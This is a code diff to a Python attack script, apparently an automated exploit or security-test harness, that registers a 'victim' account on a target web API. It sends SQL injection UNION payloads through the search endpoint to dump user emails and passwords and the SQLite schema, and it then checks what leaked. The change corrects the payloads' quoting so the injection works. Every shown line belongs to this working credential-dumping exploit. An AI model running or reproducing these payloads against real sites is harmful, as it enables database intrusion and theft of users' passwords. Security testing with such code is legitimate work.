@@ -71,13 +71,12 @@ def run(target: str, blueprint: dict) -> dict:
     victim_password = "Pt38Pass123!"
     _request("POST", f"{target}/api/Users", body={"email": victim_email, "password": victim_password, "passwordRepeat": victim_password})
 
-    cols = ",".join(str(i) for i in range(1, COLUMN_COUNT + 1))
-    creds_payload = f")) UNION SELECT email,password,{','.join(str(i) for i in range(3, COLUMN_COUNT + 1))} FROM Users-- "
+    creds_payload = f"')) UNION SELECT email,password,{','.join(str(i) for i in range(3, COLUMN_COUNT + 1))} FROM Users-- "
     creds_status, creds_body = _search(target, creds_payload)
     dumped_rows = [r.get("id", "") for r in creds_body.get("data", [])] if creds_status == 200 else []
     victim_leaked = any(victim_email in str(r) for r in dumped_rows)
 
-    schema_payload = f")) UNION SELECT sql,{','.join(str(i) for i in range(2, COLUMN_COUNT + 1))} FROM sqlite_master WHERE sql IS NOT NULL-- "
+    schema_payload = f"')) UNION SELECT sql,{','.join(str(i) for i in range(2, COLUMN_COUNT + 1))} FROM sqlite_master WHERE sql IS NOT NULL-- "
     schema_status, schema_body = _search(target, schema_payload)
     schema_rows = [r.get("id", "") for r in schema_body.get("data", [])] if schema_status == 200 else []
     schema_leaked = any("CREATE TABLE" in str(r) and "Users" in str(r) for r in schema_rows)
